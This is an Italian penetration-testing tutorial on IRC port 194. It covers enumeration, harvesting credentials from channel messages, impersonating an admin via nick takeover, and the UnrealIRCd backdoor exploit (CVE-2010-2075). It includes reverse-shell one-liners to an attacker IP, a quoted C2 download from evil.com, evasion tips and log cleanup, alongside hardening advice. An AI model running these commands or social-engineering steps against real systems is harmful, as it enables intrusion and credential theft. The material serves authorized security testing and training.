---
title: 'Porta 194 IRC: cos’è, come funziona e differenze con 6667 e 6697'
slug: porta-194-irc
description: 'Scopri a cosa serve la porta 194 IRC, perché molti server usano 6667 o 6697, come funziona il protocollo e quali rischi introduce tra enumerazione utenti, canali, leak di hostname interni e daemon vulnerabili.'
image: /porta-194-irc.webp
draft: true
date: 2026-04-04T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - irc
  - unrealircd
---

Porta 194 IRC è il punto di ingresso ufficiale per Internet Relay Chat, il protocollo di messaggistica testuale in tempo reale. Se la trovi aperta durante un pentest, hai davanti un servizio che espone utenti, canali, topic, hostname interni e spesso credenziali deboli o inesistenti. L'enumerazione porta 194 rivela nomi utente reali, struttura organizzativa (canali = team/progetti), informazioni di rete interne (hostname nei messaggi) e potenzialmente malware C2 che usa IRC come canale di comando. Nella kill chain IRC si posiziona tra recon (information gathering) e initial access (credenziali, exploit del daemon).

In questo articolo impari a enumerare un server IRC, sfruttare misconfiguration comuni, identificare backdoor e integrare IRC nella tua pipeline offensiva.

## 1. Anatomia Tecnica della Porta 194

La porta 194 è registrata IANA come `irc` su protocollo TCP. Nella pratica, molti server IRC usano la porta 6667 (non privilegiata) o 6697 (IRC over TLS). Trovare la 194 attiva indica un'installazione che segue lo standard RFC o un setup intenzionale che richiede privilegi root per il bind.

Il flusso di una connessione IRC segue questi passaggi:

1. **TCP handshake** sulla porta 194
2. **NICK/USER**: il client invia nickname e username
3. **Server response**: il server risponde con banner, MOTD (Message of the Day) e parametri
4. **JOIN**: il client entra nei canali
5. **PRIVMSG/NOTICE**: comunicazione in tempo reale

Le varianti principali sono IRC classico (porta 194/6667, cleartext), IRC over TLS (porta 6697, cifratura), e IRC con SASL authentication (meccanismo di autenticazione esterno).

```
Misconfig: Nessuna autenticazione richiesta (no NickServ/SASL)
Impatto: qualsiasi utente può connettersi, enumerare canali e utenti senza credenziali
Come si verifica: nc -nv [target] 194 poi inviare NICK test e USER test 0 * :test
```

```
Misconfig: Server info e hostname interni esposti nel banner/MOTD
Impatto: il MOTD e i messaggi di welcome rivelano versione del daemon, hostname del server, OS
Come si verifica: dopo la connessione, leggere le risposte numeriche 001-005 e 375-376
```

```
Misconfig: Canali senza mode +s (secret) o +p (private)
Impatto: il comando LIST mostra tutti i canali, topic e numero di utenti — mappa dell'organizzazione
Come si verifica: dopo connessione, inviare LIST e analizzare i risultati
```

## 2. Enumerazione Base della Porta 194

L'enumerazione porta 194 IRC è diretta: il protocollo è testuale e puoi interagire manualmente. Questo lo rende ideale per capire cosa espone il server senza tool specializzati.

### Comando 1: Nmap

```bash
nmap -sV -sC -p 194 10.10.10.50
```

**Output atteso:**

```
PORT    STATE SERVICE VERSION
194/tcp open  irc     UnrealIRCd 6.1.3
| irc-info:
|   server: irc.corp.local
|   users: 47
|   servers: 2
|   chans: 12
|   lusers: 47
|   lservers: 1
|   source host: 10.10.10.100
|_  source ident: NONE
```

**Parametri:**

* `-sV`: identifica il daemon IRC e la versione esatta (critico per cercare exploit)
* `-sC`: esegue `irc-info` che estrae utenti connessi, canali, server linkati
* `-p 194`: scan sulla porta standard IANA

### Comando 2: Connessione manuale con Netcat

```bash
nc -nv 10.10.10.50 194
```

Dopo la connessione, invia:

```
NICK recon_test
USER recon 0 * :Recon Test
```

**Output atteso:**

```
:irc.corp.local 001 recon_test :Welcome to the Corporate IRC Network recon_test!recon@10.10.10.100
:irc.corp.local 002 recon_test :Your host is irc.corp.local, running version UnrealIRCd-6.1.3
:irc.corp.local 003 recon_test :This server was created Mon Jan 15 2026 at 09:30:00 UTC
:irc.corp.local 004 recon_test irc.corp.local UnrealIRCd-6.1.3 iowghraAsORTVSxNCWqBzvdHtGpCD lvhopsmntikrRcaqOALQbSeIKVfMCuzNTGjZ
:irc.corp.local 005 recon_test NETWORK=CorpNet MAXCHANNELS=20 CHANLIMIT=#:20 MAXTARGETS=20 :are supported by this server
:irc.corp.local 375 recon_test :- irc.corp.local Message of the Day -
:irc.corp.local 372 recon_test :- Welcome to Corporate Internal Chat
:irc.corp.local 372 recon_test :- Server admin: sysadmin@corp.local
:irc.corp.local 376 recon_test :End of /MOTD command.
```

**Cosa ci dice questo output:** hai il nome del network (`CorpNet`), l'hostname interno (`irc.corp.local`), la versione esatta del daemon (`UnrealIRCd-6.1.3`), la data di creazione del server e l'email dell'admin. Il MOTD conferma che è un server corporate interno. Le modalità utente e canale supportate (codifica 004) rivelano le feature abilitate.

## 3. Enumerazione Avanzata

### Lista canali e topic

Dopo esserti connesso, enumeri tutti i canali visibili:

```
LIST
```

**Output:**

```
:irc.corp.local 322 recon_test #general 23 :Chat generale aziendale
:irc.corp.local 322 recon_test #devops 8 :Pipeline CI/CD - Jenkins: jenkins.corp.local:8080
:irc.corp.local 322 recon_test #security 5 :Incident Response Team
:irc.corp.local 322 recon_test #sysadmin 12 :Ticket system: https://tickets.corp.local
:irc.corp.local 322 recon_test #project-alpha 4 :Deployment staging: 10.10.20.50
:irc.corp.local 323 recon_test :End of /LIST
```

**Lettura dell'output:** i topic dei canali espongono URL interni (`jenkins.corp.local:8080`, `tickets.corp.local`), IP di server (`10.10.20.50`) e struttura organizzativa. Il canale `#devops` rivela un Jenkins interno — target prioritario. Questa intelligence alimenta la fase successiva di [enumerazione dei servizi web](https://hackita.it/articoli/enumeration).

### Enumerazione utenti per canale

```
JOIN #devops
WHO #devops
```

**Output:**

```
:irc.corp.local 352 recon_test #devops jmartin 10.10.10.45 irc.corp.local jmartin H :0 Juan Martin
:irc.corp.local 352 recon_test #devops asmith ws-linux-42.corp.local irc.corp.local asmith H :0 Alice Smith
:irc.corp.local 352 recon_test #devops deploy_bot 10.10.10.99 irc.corp.local deploy_bot H* :0 CI/CD Bot
:irc.corp.local 315 recon_test #devops :End of /WHO list.
```

**Lettura dell'output:** hai nomi reali (`Juan Martin`, `Alice Smith`), hostname delle workstation (`ws-linux-42.corp.local`), IP (`10.10.10.45`, `10.10.10.99`) e un bot di deployment (`deploy_bot`). L'asterisco dopo `H` di deploy\_bot indica che è operatore IRC. I nomi utente (`jmartin`, `asmith`) sono probabilmente gli stessi usati per login Active Directory. Usa queste informazioni per costruire una wordlist mirata — approfondisci le tecniche di [username enumeration](https://hackita.it/articoli/bruteforce).

### Script NSE specifici per IRC

```bash
nmap -p 194 --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor 10.10.10.50
```

**Output:**

```
PORT    STATE SERVICE
194/tcp open  irc
| irc-botnet-channels:
|_  No botnet channels detected
| irc-unrealircd-backdoor:
|_  Server appears to be patched or not vulnerable
| irc-info:
|   server: irc.corp.local
|   version: UnrealIRCd-6.1.3
|   users: 47
|_  channels: 12
```

**Lettura dell'output:** il controllo `irc-unrealircd-backdoor` verifica la backdoor presente in UnrealIRCd 3.2.8.1 (CVE-2010-2075). La versione 6.1.3 non è vulnerabile. Il check botnet non rileva canali sospetti. Queste informazioni escludono la via rapida dell'exploit e ti orientano verso tecniche di social engineering o credential abuse.

### WHOIS sugli utenti

```
WHOIS deploy_bot
```

**Output:**

```
:irc.corp.local 311 recon_test deploy_bot deploy 10.10.10.99 * :CI/CD Bot
:irc.corp.local 312 recon_test deploy_bot irc.corp.local :Corporate IRC Server
:irc.corp.local 313 recon_test deploy_bot :is an IRC Operator
:irc.corp.local 317 recon_test deploy_bot 3600 1706900000 :seconds idle, signon time
:irc.corp.local 319 recon_test deploy_bot :#devops @#deploy-logs
:irc.corp.local 318 recon_test deploy_bot :End of /WHOIS list.
```

**Lettura dell'output:** il bot è IRC Operator (accesso privilegiato al server), connesso da IP 10.10.10.99, presente nei canali `#devops` e `#deploy-logs` (dove è operatore). Un bot di deployment con privilegi IRC operator che gira su un server dedicato è un target ad alta priorità per il [lateral movement](https://hackita.it/articoli/pivoting).

## 4. Tecniche Offensive sulla Porta 194 IRC

**Raccolta credenziali dai messaggi dei canali**

Contesto: canali IRC interni senza logging awareness. Gli utenti condividono credenziali, token e comandi nei messaggi.

```bash
nc -nv 10.10.10.50 194 << 'EOF'
NICK logger_bot
USER logger 0 * :Logger
JOIN #devops
JOIN #sysadmin
EOF
```

Poi cattura tutto il traffico:

```bash
nc -nv 10.10.10.50 194 | tee irc_log.txt &
# attendi 30-60 minuti
grep -iE "password|token|secret|key|ssh|api" irc_log.txt
```

**Output (successo):**

```
:jmartin!jmartin@10.10.10.45 PRIVMSG #devops :il token per jenkins è ghp_A1b2C3d4E5f6G7h8I9j0
:asmith!asmith@ws-linux-42 PRIVMSG #sysadmin :password temporanea per il nuovo server: Changem3!
```

**Output (fallimento):**

```
(nessun match dopo 60 minuti di cattura)
```

**Cosa fai dopo:** hai un token GitHub (`ghp_*`) e una password temporanea. Testa il token su `github.corp.local` e la password su servizi interni. I nomi utente IRC (`jmartin`, `asmith`) sono i primi candidati per il login.

**Impersonation via nick takeover**

Contesto: server IRC senza NickServ o con registrazione non obbligatoria. Puoi assumere il nickname di un utente disconnesso.

```bash
nc -nv 10.10.10.50 194 << 'EOF'
NICK sysadmin
USER sysadmin 0 * :System Administrator
JOIN #security
PRIVMSG #security :ragazzi, ho bisogno che qualcuno mi mandi le credenziali del firewall, ho perso il file
EOF
```

**Output (successo):**

```
:irc.corp.local 001 sysadmin :Welcome to the Corporate IRC Network sysadmin!sysadmin@10.10.10.100
```

**Output (fallimento):**

```
:irc.corp.local 433 * sysadmin :Nickname is already in use
```

**Cosa fai dopo:** se il nick è disponibile, sei dentro come "sysadmin". Le richieste di credenziali appaiono legittime nel contesto del canale. Questa è pura social engineering — documenta tutto per il report. Per tecniche avanzate di social engineering, consulta la [guida dedicata](https://hackita.it/articoli/socialengineering).

**Exploit UnrealIRCd Backdoor (CVE-2010-2075)**

Contesto: versione specifica UnrealIRCd 3.2.8.1 con backdoor. Questa backdoor permette esecuzione di comandi arbitrari inviando `AB;` seguito dal comando.

```bash
echo "AB; id" | nc -nv 10.10.10.50 194
```

**Output (successo):**

```
:irc.corp.local NOTICE AUTH :*** Looking up your hostname...
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
```

**Output (fallimento):**

```
:irc.corp.local NOTICE AUTH :*** Looking up your hostname...
:irc.corp.local 451 AB :You have not registered
```

**Cosa fai dopo:** se il server è vulnerabile, hai RCE come utente `ircd`. Esegui una reverse shell: `AB; bash -c 'bash -i >& /dev/tcp/[tuo_IP]/4444 0>&1'`. Poi escalation dei privilegi. Nota: questo exploit funziona solo su versioni molto vecchie — verifica sempre la versione prima di tentare.

**Abuso di DCC per file transfer e port scanning**

Contesto: DCC (Direct Client-to-Client) permette connessioni dirette tra utenti IRC. Puoi usarlo per esfiltrare file o come canale laterale.

```bash
# Da un client IRC, invia una richiesta DCC SEND
/dcc send target_user /etc/passwd
```

**Output (successo):**

```
DCC SEND request sent to target_user
DCC connection established: 10.10.10.45:1024
```

**Output (fallimento):**

```
DCC SEND failed: Connection refused
```

**Cosa fai dopo:** la connessione DCC rivela l'IP reale dell'utente target (anche se è dietro NAT IRC). Usa quell'IP per scan mirati. In alternativa, puoi inviare file malevoli via DCC a utenti con client IRC vulnerabili.

## 5. Scenari Pratici di Pentest

### Scenario 1: Enterprise con IRC interno per DevOps

**Situazione:** azienda tech con server IRC interno usato dai team DevOps e Security. Nessuna autenticazione obbligatoria. Hai accesso alla rete interna da un host compromesso.

**Step 1:**

```bash
nmap -sV -p 194,6667,6697 10.10.10.0/24 --open
```

**Output atteso:**

```
10.10.10.50 - 194/tcp open irc UnrealIRCd 6.1.3
10.10.10.50 - 6667/tcp open irc UnrealIRCd 6.1.3
```

**Step 2:**

```bash
nc -nv 10.10.10.50 194 << 'EOF'
NICK enum_user
USER enum 0 * :Enum
LIST
EOF
```

**Output atteso:**

```
:irc.corp.local 322 enum_user #devops 8 :CI/CD Pipeline
:irc.corp.local 322 enum_user #infra 6 :Infrastructure - Ansible playbooks
:irc.corp.local 323 enum_user :End of /LIST
```

**Se fallisce:**

* Causa probabile: il server richiede password di connessione (PASS command prima di NICK/USER)
* Fix: aggiungi `PASS [password]` come prima riga. Prova password comuni: nome azienda, `irc`, `chat`, `welcome`

**Tempo stimato:** 5-15 minuti per connessione e enum base

### Scenario 2: Lab/CTF con IRC backdoored

**Situazione:** macchina CTF con servizio IRC su porta 194. Tipico scenario HackTheBox/TryHackMe con UnrealIRCd vulnerabile.

**Step 1:**

```bash
nmap -sV -p 194 --script irc-unrealircd-backdoor 10.10.10.50
```

**Output atteso:**

```
PORT    STATE SERVICE VERSION
194/tcp open  irc     UnrealIRCd 3.2.8.1
| irc-unrealircd-backdoor:
|_  Looks like this is an old version. Possible backdoor.
```

**Step 2:**

```bash
echo "AB; bash -c 'bash -i >& /dev/tcp/10.10.10.100/4444 0>&1'" | nc -nv 10.10.10.50 194
```

**Output atteso (sul listener):**

```
connect to [10.10.10.100] from (UNKNOWN) [10.10.10.50] 55432
bash: no job control in this shell
ircd@target:~$
```

**Se fallisce:**

* Causa probabile: firewall in uscita blocca la reverse shell
* Fix: prova porte comuni in uscita: 80, 443, 53. Oppure usa `AB; nc -e /bin/sh 10.10.10.100 443`

**Tempo stimato:** 2-5 minuti se la versione è vulnerabile

### Scenario 3: EDR-heavy con IRC come C2 detection

**Situazione:** rete enterprise con EDR avanzato. Sospetto che un malware stia usando IRC come canale C2. Il tuo compito è identificare il traffico C2 senza attivare l'EDR.

**Step 1:**

```bash
sudo tcpdump -i eth0 tcp port 194 or tcp port 6667 -A -c 200 | tee irc_traffic.txt
```

**Output atteso:**

```
14:30:01.123 IP 10.10.10.77.54321 > 203.0.113.50.6667: Flags [P.], ...
NICK bot_x8a2f
USER bot 0 * :bot
JOIN #cmd-29af
```

**Step 2:**

```bash
grep -E "JOIN|PRIVMSG|NICK" irc_traffic.txt | sort -u
```

**Output atteso:**

```
JOIN #cmd-29af
NICK bot_x8a2f
PRIVMSG #cmd-29af :!exec whoami
PRIVMSG #cmd-29af :!download http://evil.com/payload.exe
```

**Se fallisce:**

* Causa probabile: il traffico C2 è su TLS (porta 6697) e non leggibile in chiaro
* Fix: usa `tshark -i eth0 -f "tcp port 6697" -Y "ssl.handshake" -T fields -e x509.subject` per estrarre il certificato e verificare se è self-signed (indicatore C2)

**Tempo stimato:** 15-30 minuti di cattura passiva

## 6. Attack Chain Completa

```
Recon (scan porta 194) → Connessione anonima → Enum canali/utenti → Credential Harvesting → Lateral Movement (con credenziali raccolte) → Persistence (bot IRC)
```

| Fase               | Tool      | Comando chiave                                | Output/Risultato                             |
| ------------------ | --------- | --------------------------------------------- | -------------------------------------------- |
| Recon              | nmap      | `nmap -sV -p 194 --script irc-info [target]`  | Versione daemon, utenti, canali              |
| Connessione        | nc        | `NICK/USER + LIST + WHO`                      | Mappa canali, topic, hostname                |
| Credential Harvest | nc + grep | `grep -iE "password\|token" irc_log.txt`      | Credenziali condivise nei canali             |
| Social Engineering | nc        | `NICK [impersonated] + PRIVMSG`               | Credenziali ottenute via ingegneria sociale  |
| Lateral Movement   | ssh/rdp   | `ssh jmartin@10.10.10.45`                     | Accesso workstation con credenziali raccolte |
| Persistence        | python    | Bot IRC custom che riceve comandi via PRIVMSG | C2 channel persistente                       |

**Timeline stimata:** 30-120 minuti. La fase più lunga è il credential harvesting passivo (richiede che gli utenti siano attivi).

**Ruolo della porta 194:** fornisce un canale di intelligence insostituibile in ambienti dove IRC è usato internamente. Nessun altro protocollo espone contemporaneamente utenti, hostname, struttura organizzativa e conversazioni in tempo reale con così poco sforzo.

## 7. Detection & Evasion

### Cosa monitora il Blue Team

* **Log del daemon IRC**: connessioni, JOIN/PART, tentativi di operatore. Path tipico: `/var/log/ircd/` o definito nella config del daemon
* **IDS/IPS**: regole Suricata per pattern IRC noti (NICK/USER/JOIN in sequenza rapida, `AB;` per backdoor UnrealIRCd)
* **Network monitoring**: connessioni sulla porta 194 da host che non dovrebbero usare IRC
* **EDR**: process monitoring per client IRC non autorizzati (irssi, weechat, hexchat)

### Tecniche di Evasion

```
Tecnica: Utilizzo di nick plausibili
Come: usa nomi che corrispondono a utenti reali o a pattern aziendali (es: nome.cognome, iniziale+cognome)
Riduzione rumore: la connessione appare legittima nella lista utenti
```

```
Tecnica: Connessione via TLS sulla 6697
Come: openssl s_client -connect [target]:6697 poi invio comandi IRC nel tunnel TLS
Riduzione rumore: il contenuto dei messaggi non è visibile a IDS che non fanno TLS inspection
```

```
Tecnica: Limitare i comandi di enumerazione
Come: evita LIST subito dopo la connessione. Aspetta 5-10 minuti, poi JOIN su canali specifici uno alla volta
Riduzione rumore: un LIST completo genera un burst di traffico anomalo. JOIN singoli sono normali
```

### Cleanup Post-Exploitation

* Disconnetti dal server con `QUIT :Leaving` (messaggio generico, non lasciare motivi sospetti)
* Se hai creato un bot: termina il processo e rimuovi il file dal sistema compromesso
* Cancella log locali: `shred -u irc_log.txt`
* Se hai compromesso il daemon: verifica `/var/log/ircd/` e considera se la pulizia log è nel tuo scope

## 8. Toolchain e Confronto

### Pipeline operativa

```
nmap (scan 194/6667/6697) → nc/irssi (connessione manuale) → enum (LIST/WHO/WHOIS) → grep (credential harvest) → ssh/rdp (lateral movement) → python bot (persistence C2)
```

Dati che passano tra fasi: versione daemon, hostname interni, nomi utente, IP delle workstation, credenziali/token dai messaggi, struttura canali/team.

### Tabella comparativa

| Aspetto           | IRC (194/TCP)                       | Slack/Teams (443/TCP)          | Matrix (8448/TCP)                    |
| ----------------- | ----------------------------------- | ------------------------------ | ------------------------------------ |
| Porta default     | 194 (o 6667/6697)                   | 443                            | 8448                                 |
| Cifratura         | Opzionale (TLS su 6697)             | Always TLS                     | Always TLS                           |
| Auth              | Nessuna / NickServ                  | OAuth2/SSO obbligatorio        | Token/SSO                            |
| Enumerazione      | Facile (LIST/WHO)                   | Richiede token API             | Richiede autenticazione              |
| C2 usage          | Storico e attuale                   | Raro (API monitorate)          | Possibile (federazione)              |
| Quando preferirlo | Server IRC legacy interni, lab, CTF | Target con workspace aziendale | Organizzazioni tech che usano Matrix |

## 9. Troubleshooting

| Errore / Sintomo                                     | Causa                                                            | Fix                                                                                                        |
| ---------------------------------------------------- | ---------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------- |
| `Connection refused` su porta 194                    | IRC potrebbe girare su 6667/6697 invece di 194                   | Scan tutte le porte IRC: `nmap -p 194,6667,6697,6660-6669,7000 [target]`                                   |
| `ERROR :Closing Link: Access denied`                 | IP non in allow list o K-line attivo                             | Prova da un IP diverso nella rete. Verifica con `nmap --script irc-info` se restituisce info prima del ban |
| `433 Nickname already in use`                        | Il nick scelto è occupato o registrato                           | Usa variante: `NICK recon_test2` oppure attendi che l'utente si disconnetta                                |
| Nessun canale visibile dopo LIST                     | Tutti i canali sono mode +s (secret)                             | Prova a JOIN su nomi comuni: `#general`, `#help`, `#admin`, `#dev`, `#ops`                                 |
| Connessione si chiude dopo 60 secondi                | Non hai completato la registrazione (NICK+USER) entro il timeout | Invia NICK e USER immediatamente dopo la connessione TCP                                                   |
| `ERROR :Your host is trying to (re)connect too fast` | Throttling anti-flood attivo                                     | Attendi 30-60 secondi tra tentativi. Usa `-w 5` con nc per timeout più lunghi                              |

## 10. FAQ

**D: Come enumerare utenti e canali IRC sulla porta 194 durante un pentest?**

R: Connettiti con `nc -nv [target] 194`, invia `NICK` e `USER` per registrarti, poi `LIST` per i canali e `WHO #canale` per gli utenti di ogni canale. Il comando `WHOIS [nick]` fornisce dettagli su un utente specifico, inclusi hostname e idle time.

**D: Porta 194 IRC è ancora usata nel 2026?**

R: Sì, in contesti specifici. Molte organizzazioni open source usano IRC (Libera.Chat, OFTC). In ambito corporate si trova in aziende tech legacy. Nei CTF e lab è comune per la sua semplicità. Come canale C2 per malware, IRC resta attivo per botnet che sfruttano la semplicità del protocollo.

**D: Qual è la differenza tra porta 194 e porta 6667 per IRC?**

R: La porta 194 è lo standard IANA ufficiale ma richiede privilegi root per il bind (porta \<1024). La 6667 è la porta non privilegiata usata dalla maggioranza dei server IRC reali. La 6697 è la porta standard per IRC over TLS. In pentest, scansiona tutte e tre più il range 6660-6669.

**D: Come identificare un canale IRC usato come C2 da malware?**

R: Cerca pattern anomali: nomi canale con hash o stringhe random (`#cmd-29af`), nickname con prefissi generici (`bot_*`), messaggi con comandi (`!exec`, `!download`, `!shell`), connessioni a server esterni da host interni. Cattura il traffico con `tcpdump -A -i eth0 tcp port 194` e filtra con grep.

**D: L'exploit UnrealIRCd backdoor (CVE-2010-2075) funziona ancora?**

R: Solo su UnrealIRCd versione 3.2.8.1 distribuita tra novembre 2009 e giugno 2010 con il pacchetto compromesso. Le versioni attuali (6.x) non sono vulnerabili. Verifica sempre la versione con `nmap -sV -p 194 [target]` prima di tentare. Nei CTF è ancora un exploit comune.

**D: Come proteggere un server IRC dalla porta 194?**

R: Richiedi autenticazione SASL o NickServ per tutti gli utenti. Imposta canali sensibili come `+s` (secret) e `+k` (password). Configura ACL per limitare le connessioni a IP/subnet autorizzati. Usa TLS sulla 6697 e disabilita la 194 cleartext. Aggiorna il daemon IRC regolarmente.

## 11. Cheat Sheet Finale

| Azione              | Comando                                                 | Note                                      |
| ------------------- | ------------------------------------------------------- | ----------------------------------------- |
| Scan porte IRC      | `nmap -sV -p 194,6667,6697 [target]`                    | Includi range 6660-6669 se necessario     |
| Connessione manuale | `nc -nv [target] 194` poi `NICK/USER`                   | Completa entro 60 sec per evitare timeout |
| Lista canali        | `LIST`                                                  | Dopo registrazione NICK/USER              |
| Utenti di un canale | `JOIN #canale` poi `WHO #canale`                        | Rivela hostname e IP                      |
| Info su utente      | `WHOIS [nick]`                                          | Idle time, canali, IP, operatore status   |
| Versione server     | `VERSION`                                               | Alternativa a nmap -sV                    |
| Check backdoor      | `nmap -p 194 --script irc-unrealircd-backdoor [target]` | Solo per UnrealIRCd 3.2.8.1               |
| Cattura traffico    | `sudo tcpdump -i eth0 tcp port 194 -A \| tee irc.log`   | Per credential harvest passivo            |
| Connessione TLS     | `openssl s_client -connect [target]:6697`               | Poi comandi IRC nel tunnel                |
| Exploit backdoor    | `echo "AB; id" \| nc -nv [target] 194`                  | Solo versioni compromesse                 |

### Perché Porta 194 è rilevante nel 2026

IRC sopravvive in nicchie ad alto valore per il pentester: reti corporate legacy, comunità open source, laboratori di formazione e — soprattutto — come canale C2 per malware. La semplicità del protocollo (testuale, senza autenticazione obbligatoria, facilmente scriptabile) lo rende ideale sia per l'attacco che per la difesa. Verifica la presenza di server IRC nella tua rete con `nmap -p 194,6667,6697 [subnet] --open` come parte dello scan iniziale.

### Hardening e Mitigazione

* Richiedi SASL authentication per tutte le connessioni: config UnrealIRCd `set { require-module "sasl"; }`
* Imposta tutti i canali sensibili come `+s` (secret) e `+i` (invite-only)
* Disabilita la porta 194 cleartext e usa solo 6697 con TLS: `listen { ip *; port 6697; options { tls; }; };`
* Limita connessioni per IP con `set { throttle { connections 3; period 60; }; }`

### OPSEC per il Red Team

Una connessione IRC genera log immediati sul daemon: IP sorgente, nickname, timestamp di connessione. Il comando `LIST` produce un log aggiuntivo. Per ridurre visibilità: usa un nickname che si confonda con gli utenti esistenti (stessa convenzione di naming), evita `LIST` completi e fai `JOIN` su canali specifici basati su intelligence precedente, connettiti da un IP che ha già traffico IRC legittimo verso il server. Il livello di rumore è medio-basso se segui queste precauzioni.

***

Tutti i comandi e le tecniche descritti in questo articolo sono destinati esclusivamente ad ambienti autorizzati: penetration test con contratto firmato, laboratori personali, piattaforme CTF. Riferimento tecnico: RFC 1459 (IRC Protocol), RFC 2812 (IRC Client Protocol), RFC 7194 (IRC TLS).

***Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).***\
\
Leggi anche questa guida utile per penetration/CTF. [https://www.verylazytech.com/network-pentesting/irc-ports-194-6667-6660-7000](https://www.verylazytech.com/network-pentesting/irc-ports-194-6667-6660-7000)
